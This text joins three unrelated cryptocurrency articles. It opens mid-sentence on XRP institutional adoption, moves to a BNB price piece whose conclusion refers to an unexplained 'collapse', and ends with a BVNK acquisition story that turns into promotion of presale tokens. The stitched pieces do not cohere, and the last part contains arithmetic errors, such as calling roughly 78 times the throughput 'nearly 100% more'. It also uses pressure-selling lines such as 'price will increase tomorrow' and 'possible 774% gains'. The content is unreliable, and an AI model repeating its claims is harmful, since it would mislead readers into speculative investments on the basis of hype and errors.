highlighted. “Institutions are starting to treat XRP as a serious operational and treasury asset,” he noted, citing examples like Bank of America’s pilot programs that leverage Ripple’s payment network. We are on X, follow us to connect with us :- @TimesTabloid1 — TimesTabloid (@TimesTabloid1) June 15, 2025 This shift indicates that XRP is being recognized not only as a transactional tool but also as a valuable liquidity and treasury management asset. As more financial entities adopt Ripple’s infrastructure, XRP’s role as a bridge currency within institutional finance continues to strengthen. Technological Superiority and Scalability Hilton underscored XRP’s technological edge as a crucial part of its long-term growth. “The XRP Ledger can settle transactions in three to five seconds,” he said, describing its superior speed and reliability. This capability gives XRP a clear advantage over slower blockchain systems and traditional payment rails like ACH and SWIFT. Its low transaction costs and scalability make it ideal for diverse applications, including stablecoin issuance, tokenized assets, and decentralized finance — all of which expand XRP’s real-world relevance. Regulatory Clarity and Expanding Network Growth After years of legal uncertainty, XRP is entering a new era of clarity. “The lawsuit is behind us, and regulators are no longer on our trail to create bogus cases or anything like that,” Hilton stated. This regulatory peace has reignited confidence among investors and institutions alike.

Market participants are left wondering about the future trajectory of BNB's value. Uncertainty looms, and the crypto community is eager to know which coins might surge amid the turmoil. This article delves into potential growth opportunities and the ramifications for BNB prices. BNB Steadily Climbing: Can It Break the Resistance Levels? Source: tradingview BNB is trading in a higher price range, between four-figure values. Its recent one-month climb of nearly 41% shows strong upward momentum. In the last six months, BNB's price has more than doubled, with a surge of over 107%. As it approaches the nearest resistance of around $1318, it faces a potential rally. Breaking past this could drive the price towards the mid-four-figure mark, the higher resistance level. While experiencing a mild pullback, the potential for growth remains, especially if it breaches resistance. BNB’s journey appears optimistic, displaying resilience and strength in the crypto market. Conclusion The collapse has put pressure on BNB. Short-term price fluctuations are expected. BNB could stabilize with strong community support. Investors might explore other coins for safety. Market trends will play a key role in recovery. Disclaimer: This article is provided for informational purposes only.

Depending on whose deal wins, Coinbase would strengthen its foothold in the stablecoin economy. And what does it mean for Mastercard? Well, the TradFi giant could update its payment rails to keep up with the demand for fiat-pegged digital money. Both outcomes mark a significant step in bringing mainstream users into crypto. Thus, there may not be a better time to scoop up the best altcoins to buy ahead of the next season. BVNK Might Fetch Up to $2.5B in Coinbase-Mastercard Takeover Since going live in 2021, BVNK has been well-known for seamlessly integrating stablecoins into payments, cross-border transfers, and treasury operations. The firm hit its stride in December last year, raising $50M in a series B round that valued it at $750M. Per sources like Fortune, it’ll cost around $1.5B–$2.5B for Coinbase or Mastercard to bring BVNK under their wings. No final agreement has yet been reached, but, according to various sources like Fortune, Coinbase has the upper hand. Suppose Mastercard does get its way, it wouldn’t be the first major bank to back BVNK. Visa invested in the company back in May , but the exact amount was never officially disclosed. Visa’s investment was likely strategic, considering it occurred just before President Trump signed the GENIUS Act in July . As a result, there’s now an established federal framework for stablecoin issuers in the US, helping the market hit a sizable $309.5B market cap to date . US dollar-backed stablecoins lead the race – $USDT with a $177.9B market cap , followed by $USDC at $75.4B. But it’s not only stablecoins that benefit from this renewed institutional adoption and regulatory clarity. Increased market liquidity and accessibility often spill over into the rest of the crypto market. It’ll possibly fuel the growth of altcoins, perhaps ones with competitive edges, like Bitcoin Hyper ($HYPER) , INFINIT ($IN) , and Snorter Token ($SNORT) . 1. Bitcoin Hyper ($HYPER) – Layer-2 Network Aiming to Fix Bitcoin’s Biggest Flaws Bitcoin Hyper ($HYPER) sets out to solve Bitcoin’s biggest pain points, including speed, cost, and scalability. It aims to achieve this by launching a Layer-2 (L2) network that’ll leverage the Solana Virtual Machine (SVM) . And it’s no wonder that it seeks Solana-level throughput. Right now, Bitcoin can only process 9.98 tps on average, whereas Solana facilitates around 780.6 tps (nearly 100% more!). As a result of Bitcoin only being able to handle a limited amount of tps, users compete for block space. Not only does this slow down Bitcoin’s transaction speeds, but it drives up the network’s fees, which currently average $1.258 – roughly 46,500% higher than Solana’s $0.0027 . So, Hyper taking advantage of the SVM’s capabilities makes the utmost sense to create a cost-friendly alternative chain. Unlocking Bitcoin’s full potential, however, is a Canonical Bridge . By bridging the original network with the L2, you’ll be able to access DeFi, NFTs, dApps, and even check out the next crypto to explode on launchpads. But to leverage the Hyper ecosystem’s full suite of benefits, you’ll want to scoop up some $HYPER on presale. Right now, the token’s available for just $0.013095. $HYPER has already raised a whopping $23M on presale, owing to opening exclusive benefits to token holders: governance rights, lower gas fees, and staking rewards, currently at a 51% APY. There’s no better time to join the $HYPER presale ; its price will increase tomorrow and is anticipated to break $0.32 this year. (Check out our Bitcoin Hyper price prediction for more information.)

INFINIT($IN) – Blends DeFi With Real-World Business Tools, Token Spikes 119% $IN is the native token of INFINIT, a vertical banking platform that’s solely built for small and medium-sized enterprises (SMEs). It helps streamline the operations of various industries – energy, automotive, healthcare, and real estate – by combining AI-powered business tools with financial services. And it’s succeeding at doing precisely that, as evidenced by it operating across 10+ countries, generating $200M+ in finance, and targeting 200K SMEs. To access INFINITE’s full range of features, you need to purchase $IN. The token unlocks advanced AI-agent strategies, fee discounts, premium tools, and higher usage limits. $IN also thrives on the platform’s developments. For instance, the token’s up by over 119% since yesterday, following news that INFINIT launched ‘Agentic DeFi’ on the Plasma platform. In doing so, it has integrated over $5B in deep liquidity with instant settlement. As this new development continues gaining traction, now could be a favorable time to purchase $IN. It’s available on some of the best crypto exchanges (including MEXC and Binance ) for roughly $0.25. 3. Snorter Token ($SNORT) – Telegram Trading Bot Set to Go Live on Solana Soon As the native token of the upcoming Telegram trading bot Snorter Bot, Snorter Token ($SNORT) is making waves on presale, having raised over $4.5M. The bot will first launch on Solana to leverage its fast speeds, automation, simplicity, and cost-friendly fees. Then, it’ll branch out across Ethereum and other EVM-compatible chains so that you can expand your horizons beyond the best Solana meme coins . Regardless of your preferred chain, it sets itself apart by enabling you to snipe new tokens instantly, copy top-performing wallets, and trade directly within the Telegram app. To get the most out of the bot, however, you’ll want to buy $SNORT on presale . In doing so, you’ll also be granted lower trading fees (0.85% vs. up to 2%), 110% APY staking rewards, and exclusive premium tools. One $SNORT currently only costs $0.1075, but don’t wait around to buy at this price. Once listed on top exchanges, our Snorter Token price prediction says it could break around $0.94 this year. Buy $SNORT for possible 774% gains. Disclaimer: This isn’t financial advice. Always DYOR and don’t invest more than you’re willing to lose.
